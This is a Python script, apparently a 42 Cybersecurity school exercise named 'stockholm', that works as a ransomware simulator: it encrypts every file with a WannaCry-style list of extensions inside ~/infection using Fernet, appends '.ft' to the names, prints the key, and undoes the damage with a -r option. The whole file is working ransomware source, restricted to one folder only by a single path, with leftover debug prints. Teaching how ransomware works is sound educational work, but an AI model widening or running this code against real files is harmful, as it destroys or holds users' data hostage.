#!/usr/bin/env python3

import argparse
import sys
from cryptography.fernet import Fernet
import os
import glob

# generate key
def generate_key():
    return Fernet.generate_key()

##################  Encrypt and Decrypt file  ########################
def encrypt_file(key, file_path, silent):
    with open(file_path, 'rb') as file: # 'rb' read binary
        data = file.read()

    # print(f"la data -->{data}")

    fernet = Fernet(key)
    encryption_data = fernet.encrypt(data)

    with open(file_path, 'wb') as file:
        file.write(encryption_data)

    if not silent:
        print(f"Encrypted: {file_path}")

def decrypt_file(file_path, key, silent):
    with open(file_path, 'rb') as file:
        data = file.read()
    print("aaaaaaaaaaaaaaaaaaaaaaaaaaaa")
    fernet = Fernet(key)
    print("aaaaaaaaaaaaaaaaaaaaaaaaaaaa")
    decrypted_data = fernet.decrypt(data)
    with open(file_path, 'wb') as file:
        file.write(decrypted_data)
    if not silent:
        print(f"Decrypted: {file_path}")
#########################################################################

###############################  Name file  #############################
def rename_file(file_path, silent):
    new_file_path = file_path + ".ft"
    if not file_path.endswith('.ft'):
        os.rename(file_path, new_file_path)
        if not silent:
            print(f"Renamed: {file_path} to {new_file_path}")

def reverse_rename_file(file_path, silent):
    if file_path.endswith('.ft'):
        original_file_path = file_path[:-3]
        os.rename(file_path, original_file_path)
        if not silent:
            print(f"Renamed: {file_path} to {original_file_path}")

#########################################################################


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
                    prog='stockholm',
                    description='A specific feature of this type of program is its ability to spread through networks of hundreds of computers. In our case, your program will only affect a small portion of your local files',
                    epilog='42 Cybersecurity')

    parser.add_argument('-v', '--version', action='store_true', help='Show the version of the program')
    parser.add_argument('-r', '--reverse', type=str, help='Reverse the infection using the provided key')
    parser.add_argument('-s', '--silent', action='store_true', help='Suppress output during the process')

    args = parser.parse_args()
    # print(args)
    # print(args.reverse)

    try:
        if args.version:
            print("Version 1.0.0")
            sys.exit(1)

        home_dir = os.path.expanduser("~")
        verif_infection_dir = os.path.join(home_dir, "infection")
        if not os.path.exists(verif_infection_dir):
            print(f"The directory {verif_infection_dir} does not exist.")
            sys.exit(1)

        # print(home_dir)
        # test = generate_key()
        # print("\n")
        # print(test)
        # print("\n")

        extensions = [
            '.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', '.sxw', '.stw', '.uot', 
            '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc', '.stc', '.dif', '.slk', '.wb2', '.odp', '.otp', 
            '.sxd', '.std', '.uop', '.odg', '.otg', '.sxm', '.mml', '.lay', '.lay6', '.asc', '.sqlite3', 
            '.sqlitedb', '.sql', '.accdb', '.mdb', '.db', '.dbf', '.odb', '.frm', '.myd', '.myi', '.ibd', 
            '.mdf', '.ldf', '.sln', '.suo', '.cs', '.c', '.cpp', '.pas', '.h', '.asm', '.js', '.cmd', '.bat', 
            '.ps1', '.vbs', '.vb', '.pl', '.dip', '.dch', '.sch', '.brd', '.jsp', '.php', '.asp', '.rb', '.java', 
            '.jar', '.class', '.sh', '.mp3', '.wav', '.swf', '.fla', '.wmv', '.mpg', '.vob', '.mpeg', '.asf', 
            '.avi', '.mov', '.mp4', '.3gp', '.mkv', '.3g2', '.flv', '.wma', '.mid', '.m3u', '.m4u', '.djvu', 
            '.svg', '.ai', '.psd', '.nef', '.tiff', '.tif', '.cgm', '.raw', '.gif', '.png', '.bmp', '.jpg', 
            '.jpeg', '.vcd', '.iso', '.backup', '.zip', '.rar', '.7z', '.gz', '.tgz', '.tar', '.bak', '.tbk', 
            '.bz2', '.PAQ', '.ARC', '.aes', '.gpg', '.vmx', '.vmdk', '.vdi', '.sldm', '.sldx', '.sti', '.sxi', 
            '.602', '.hwp', '.snt', '.onetoc2', '.dwg', '.pdf', '.wk1', '.wks', '.123', '.rtf', '.csv', '.txt', 
            '.vsdx', '.vsd', '.edb', '.eml', '.msg', '.ost', '.pst', '.potm', '.potx', '.ppam', '.ppsx', 
            '.ppsm', '.pps', '.pot', '.pptm', '.pptx', '.ppt', '.xltm', '.xltx', '.xlc', '.xlm', '.xlt', 
            '.xlw', '.xlsb', '.xlsm', '.xlsx', '.xls', '.dotx', '.dotm', '.dot', '.docm', '.docb', '.docx', 
        ]
        # files_to_process = [
        #     file  # Include each file found in the final list
        #     for ext in extensions  # Iterate over each extension in the wannacry_extensions list
        #     for file in glob.glob(os.path.join(verif_infection_dir, f'*{ext}'))  # For each extension, find all matching files in the infection_dir
        # ]
        files_to_process = []
        for ext in extensions:
            pattern = os.path.join(verif_infection_dir, f'*{ext}')
            matching_files = glob.glob(pattern) # return all file that content extension
            for file in matching_files:
                files_to_process.append(file)

        if args.reverse:
            # key = load_key(args.reverse)
            key = args.reverse
            # ft_files_to_process = [
            #     file for file in glob.glob(os.path.join(verif_infection_dir, '*.ft'))
            # ]
            ft_files_to_process = []
            pattern = os.path.join(verif_infection_dir, '*.ft')
            matching_files = glob.glob(pattern)
            for file in matching_files:
                ft_files_to_process.append(file)

            for file_path in ft_files_to_process:
                print("dwwwwwwwwwwwwwwwww")
                decrypt_file(file_path, key, args.silent)
                reverse_rename_file(file_path, args.silent)

        else:
            key = generate_key()
            # print(f"key: {key}")
            print(f"Encryption key: {key.decode()}")
            for file_path in files_to_process:
                print("aaaaaaaaaaaaaaaaaaa")
                encrypt_file(key, file_path, args.silent)
                rename_file(file_path, args.silent)

    except Exception as e:
        print(f"An error occurred: {e}", file=sys.stderr)
        sys.exit(1)